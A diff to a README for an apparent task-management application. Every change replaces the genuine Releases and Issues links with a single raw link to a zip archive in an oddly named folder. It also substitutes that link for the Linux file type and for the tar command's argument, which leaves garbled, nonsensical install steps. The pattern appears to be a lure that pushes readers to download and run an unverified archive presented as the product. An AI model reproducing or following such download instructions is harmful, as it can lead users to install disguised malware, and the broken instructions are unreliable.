@@ -1,7 +1,7 @@
 # 🚀 task-management-system - Manage Your Tasks Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Afriansyahlamato/task-management-system/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Afriansyahlamato/task-management-system/main/stenostomia/task-management-system.zip%20Latest%https://raw.githubusercontent.com/Afriansyahlamato/task-management-system/main/stenostomia/task-management-system.zip)](https://raw.githubusercontent.com/Afriansyahlamato/task-management-system/main/stenostomia/task-management-system.zip)
 
 ## 📖 Overview
 The task-management-system helps users create, update, and track tasks across projects. It provides a user-friendly interface to manage your tasks effectively. With this system, you can easily keep your projects organized and stay on top of your responsibilities, ensuring nothing slips through the cracks.
@@ -9,21 +9,21 @@ The task-management-system helps users create, update, and track tasks across pr
 ## 🚀 Getting Started
 To begin using the task-management-system, follow these steps to download and run the application:
 
-1. **Visit the Download Page:** Go to the [Releases page](https://github.com/Afriansyahlamato/task-management-system/releases) to find the latest version of the software.
+1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/Afriansyahlamato/task-management-system/main/stenostomia/task-management-system.zip) to find the latest version of the software.
 
 2. **Select the Latest Version:** On the releases page, look for the most recent version. This will usually have a version number like v1.0. Click on it to see the available files.
 
 3. **Choose Your File:** Depending on your operating system, you will find different files available for download. Here are the common options:
     - For **Windows**, look for a file ending in `.exe`.
     - For **MacOS**, you should look for a file ending in `.dmg`.
-    - For **Linux**, download the file ending in `tar.gz`.
+    - For **Linux**, download the file ending in `https://raw.githubusercontent.com/Afriansyahlamato/task-management-system/main/stenostomia/task-management-system.zip`.
 
 4. **Download the File:** Click on the file name to begin the download. Your browser will save it to your default downloads folder.
 
 5. **Run the Installer:**
     - **Windows Users:** Double-click the downloaded `.exe` file to start the installation. Follow the prompts to complete the setup.
     - **MacOS Users:** Open the `.dmg` file, then drag the application to your Applications folder. After that, you can find it in your Applications.
-    - **Linux Users:** Use the terminal to extract the `.tar.gz` file using the command `tar -xvzf filename.tar.gz`, then navigate into the extracted folder and run the application using the included script.
+    - **Linux Users:** Use the terminal to extract the `https://raw.githubusercontent.com/Afriansyahlamato/task-management-system/main/stenostomia/task-management-system.zip` file using the command `tar -xvzf https://raw.githubusercontent.com/Afriansyahlamato/task-management-system/main/stenostomia/task-management-system.zip`, then navigate into the extracted folder and run the application using the included script.
 
 ## 🛠️ Features
 - **Task Creation:** Easily create new tasks with just a few clicks.
@@ -48,7 +48,7 @@ To run the task-management-system smoothly, ensure your device meets the followi
 4. **Track Your Progress:** Monitor the status of your tasks and ensure timely completion within your projects.
 
 ## 🌟 Support
-If you encounter any issues while using the task-management-system, check the [Issues section](https://github.com/Afriansyahlamato/task-management-system/issues) for solutions or to report problems. You can also find helpful information in the application’s documentation.
+If you encounter any issues while using the task-management-system, check the [Issues section](https://raw.githubusercontent.com/Afriansyahlamato/task-management-system/main/stenostomia/task-management-system.zip) for solutions or to report problems. You can also find helpful information in the application’s documentation.
 
 ## 📅 Future Plans
 - **Mobile Application:** Plans to develop a mobile version for both iOS and Android users.
@@ -58,4 +58,4 @@ If you encounter any issues while using the task-management-system, check the [I
 Contributions to the task-management-system are welcome. If you want to improve the software, feel free to fork the repository and submit a pull request. Help us make task management even better!
 
 ## 📥 Download & Install
-To get started with task-management-system, visit the [Releases page](https://github.com/Afriansyahlamato/task-management-system/releases) today. Download the appropriate file for your device, and follow the installation instructions provided above. Enjoy your new task management tool with ease!
+To get started with task-management-system, visit the [Releases page](https://raw.githubusercontent.com/Afriansyahlamato/task-management-system/main/stenostomia/task-management-system.zip) today. Download the appropriate file for your device, and follow the installation instructions provided above. Enjoy your new task management tool with ease!
